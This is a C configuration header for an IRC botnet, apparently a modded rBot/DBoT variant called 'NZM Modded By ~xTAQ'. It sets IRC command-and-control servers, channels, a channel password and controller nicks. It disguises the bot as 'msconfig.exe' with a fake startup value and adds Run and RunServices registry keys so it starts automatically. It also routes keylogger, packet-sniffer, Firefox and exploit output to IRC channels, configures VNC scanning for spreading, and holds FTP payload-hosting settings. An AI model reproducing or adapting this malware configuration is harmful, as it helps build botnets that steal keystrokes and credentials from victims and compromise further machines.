/*
NZM Modded By ~xTAQ

*/


// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// Server port
int port2 = 7000;				// Backup server port
int socks4port = 1080;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 80;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// Set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// Use random file name
BOOL AutoStart = TRUE;			// Enable autostart registry keys
char prefix = '@';				// Command prefix (one character max.)
int maxrand = 4;				// How many random numbers in the nick
int nicktype = OSNICK;		    // Nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// Nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="%temp%\\yes.jpg";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.



char lsaip[] = "cFTP Hostname IP";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "cFTP Port";			// cftp port ".lsaport 6969"
char lsuser[] = "cFTP UserName";
char lspass[] = "cFTP Password";

// these have been tested and give best results, DON'T CHANGE!

SCANALL scanall[]={
{"vnc", true},
{NULL, false}
};

//
BOOL sp2_mod = TRUE;			    	             // Sp2mod
char botid[] = "xxxxxx";				            // Bot id
char version[] = "MoDDeD By ~xTAQ";		             // Bots !version reply
char password[] = "";					     // Bot password
char server[] = "";                    // Server
char serverpass[] = "";					     // Server password
char channel[] = "#kenshin";				     // Channel that the bot should join
char chanpass[] = "";    // Channel password
char server2[] = "";   // Backup server (optional)
char channel2[] = "#IoN2";				     // Backup channel (optional)
char chanpass2[] = "DoubleTeam";					     // Backup channel password (optional)
char filename[] = "msconfig.exe";		// Destination file name *** your payload should match this too ***
char keylogfile[] = "update32.log";				     // Keylog filename
char valuename[] = "DRam prosessor"; 				// Value name for autostart
char nickconst[] = "rB-";		         			// First part to the bot's nick
char szLocalPayloadFile[]="msconfig.dat";		        // **** make this the same as your bot filename! ****
char modeonconn[] = "+x+iB";					 // Can be more than one mode and contain both + and -
char exploitchan[] = "";	   	  		// Channel where exploit messages get redirected
char keylogchan[] = "#";					 // Channel where keylog messages get redirected
char psniffchan[] = "#";		 			// Channel where psniff messages get redirected
char fxchan[] = "#";						//---rename to firefox channel 
		
char vncchan[] = "#"; 

char techchan[] = "#"; 



char *authost[] = {
	"*@*"
};

char *authnick[] = { 
   "Taquito",
   "yournickhere",
};

char *versionlist[] = { 
	"DBoT Modded v12.0",
	"DBoT Modded v12.1",
    "DBoT Modded v12.2",
    "DBoT Modded v12.3",
	"DBoT Modded v12.4",
	"DBoT Modded v12.5",
	"DBoT Modded v12.6",
	"DBoT Modded v12.7",
	"DBoT Modded v12.8",
	"DBoT Modded v12.9",



};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "...";               // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

